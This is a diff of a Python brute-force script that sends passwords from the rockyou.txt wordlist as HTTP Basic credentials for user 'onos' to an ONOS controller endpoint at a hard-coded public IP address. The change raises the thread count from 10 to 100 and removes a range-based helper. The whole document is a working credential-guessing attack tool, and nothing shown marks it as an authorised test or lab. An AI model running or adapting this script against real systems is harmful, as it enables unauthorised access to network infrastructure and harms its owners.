@@ -4,11 +4,12 @@ from concurrent.futures import ThreadPoolExecutor
 
 url = "http://34.139.11.27:8181/onos/v1/docs/index.html"
 username = "onos"
-wordlist_path = '../wordlists/rockyou.txt'
-num_threads = 10
+wordlist_path = 'brute-force/wordlists/rockyou.txt'
+num_threads = 100
 
 def encode_credentials(username:str, password:str):
     credentials =  f"{username}:{password}"
+
     return base64.b64encode(credentials.encode('ISO-8859-1')).decode("ISO-8859-1")
 
 def try_password(password: str):
@@ -27,15 +28,10 @@ def try_password(password: str):
         else:
             print(f"[FAILED] Unsuccessful attempt with password: '{password}'")
     except Exception as e:
+        
         print(f"[ERROR] Exception occurred for password '{password}': {e}")
     return False
 
-def brute_force_range(start, end):
-    with open(wordlist_path, 'r', encoding='ISO-8859-1') as wordlist:
-        passwords = wordlist.readlines()[start:end]
-        for password in passwords:
-            if try_password(password):
-                break
 
 def main():
     with open(wordlist_path, 'r', encoding='ISO-8859-1') as wordlist:
